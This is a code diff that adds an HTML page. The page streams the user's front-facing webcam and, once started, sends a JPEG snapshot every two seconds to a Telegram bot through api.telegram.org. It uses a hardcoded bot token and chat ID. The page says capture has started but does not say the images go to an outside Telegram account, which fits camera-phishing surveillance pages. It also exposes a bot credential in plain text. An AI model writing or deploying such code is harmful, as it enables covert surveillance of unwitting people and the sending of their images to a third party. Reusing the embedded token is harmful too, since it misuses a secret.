@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Auto Telegram Camera</title>
+<style>
+    body {
+        margin: 0;
+        background: black;
+        color: white;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        font-family: sans-serif;
+    }
+    video {
+        width: 100%;
+        max-width: 360px;
+        transform: scaleX(-1);
+        border: 2px solid #0f0;
+    }
+    button {
+        margin-top: 12px;
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<button onclick="start()">▶ START AUTO SEND</button>
+
+<script>
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+
+const BOT_TOKEN = "7917384016:AAG7cxyuts9UJ-Km0BMqBeQVJEJfstH239g";
+const CHAT_ID = "8319568593";
+
+let intervalId = null;
+
+navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" }
+}).then(stream => {
+    video.srcObject = stream;
+});
+
+function start() {
+    if (intervalId) return;
+
+    intervalId = setInterval(captureAndSend, 2000);
+    alert("Auto capture started (every 2 seconds)");
+}
+
+function captureAndSend() {
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    ctx.translate(canvas.width, 0);
+    ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", CHAT_ID);
+        formData.append("photo", blob);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        }).catch(err => console.error(err));
+    }, "image/jpeg", 0.7);
+}
+</script>
+
+</body>
+</html>
